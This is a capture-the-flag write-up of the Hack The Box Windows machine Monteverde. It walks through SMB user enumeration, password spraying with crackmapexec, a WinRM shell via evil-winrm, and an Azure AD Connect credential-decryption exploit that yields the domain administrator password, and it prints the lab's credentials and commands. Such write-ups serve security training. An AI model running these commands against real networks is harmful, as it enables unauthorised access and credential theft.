---
title: "[Writeup] Hack The Box: Monteverde"
date: 2020-05-05T23:28:11+07:00
categories: [writeup]
tags: [writeup, walkthrough, htb, hackthebox]
---

Monteverde is a Medium difficulty Windows box. You don't need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, *"Enumeration is the key"*.

{{< img src="/images/htb_monteverde/infocard.png">}}

<!--more-->

**OS:** Windows  
**Difficulty:** Medium  
**Points:** 30  
**Release:** 11 Jan 2020  
**IP:** 10.10.10.172  
**Box Creator:** egre55  
**Date Cleared:** 23 Apr 2020

## Information Gathering

Starting with `nmap` as usual.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-05 13:30:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB1759D%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

I used `enum4linux` and found a list of users on the target.

{{< img src="/images/htb_monteverde/enum4linux.png">}}

## Gaining Access

I put the usernames found into a text file then performed a simple password spraying with `crackmapexec`, and found that the credential `SABatchJobs:SABatchJobs` is valid.

`crackmapexec smb 10.10.10.172 -u ./userlist  -p ./userlist`

{{< img src="/images/htb_monteverde/SABatchJobs.png">}}

The user `SABatchJobs` could be used to list the SMB shares.

`smbclient -L \\\\10.10.10.172 -U 'MEGABANK\SABatchJobs'`

{{< img src="/images/htb_monteverde/shares.png">}}

The `users$` share is accessible with `SABatchJobs`, so I mounted the share to my file system for the ease of searching.

`mkdir users$`
`mount -t cifs //10.10.10.172/users$ ./mount -o username=SABatchJobs,password=SABatchJobs,domain=MEGABANK`

{{< img src="/images/htb_monteverde/share_users.png">}}

I found a file named `mhope/azure.xml` with password in users$ share

{{< img src="/images/htb_monteverde/share_users_mhope.png">}}

Using `crackmapexec` to test the new password found with the user list we got, I found that `mhope:4n0therD4y@n0th3r$` is valid.

`crackmapexec smb 10.10.10.172 -u ./userlist  -p '4n0therD4y@n0th3r$'`

{{< img src="/images/htb_monteverde/crackmapexec_mhope.png">}}

From the `nmap` result in the beginning, we can see that WinRM port `5985` is open, so I used [`evil-winrm`](https://github.com/Hackplayers/evil-winrm)to connect to the target and got the user shell.

`evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`

{{< img src="/images/htb_monteverde/shell_mhope.png">}}

## Privilege Escalation

Using `whoami /all`, I found an interesting group `Azure Admins`.

{{< img src="/images/htb_monteverde/whoami.png">}}

Looking in the `Program Files` directory, I found that Microsoft Azure AD Connect is installed on the machine.

{{< img src="/images/htb_monteverde/programfiles.png">}}

With a brief Google search, I found that AD Connect has a privilege escalation vulnerability (<https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/>).

{{< img src="/images/htb_monteverde/adconnectvuln.png">}}

I uploaded the precompiled exploit binary from <https://github.com/VbScrub/AdSyncDecrypt/releases> to the target machine using `wget` and `SimpleHTTPServer`.

{{< img src="/images/htb_monteverde/upload.png">}}

I went to Microsoft Azure AD Sync directory and run the exploit to get administrator credentials.

`cd "C:\Program Files\Microsoft Azure AD Sync\Bin"`
`C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\AdDecrypt.exe -FullSQL`

{{< img src="/images/htb_monteverde/azureadexploit.png">}}

With the credentials found, I could log in as the Administrator.

`evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'`

{{< img src="/images/htb_monteverde/admin_shell.png">}}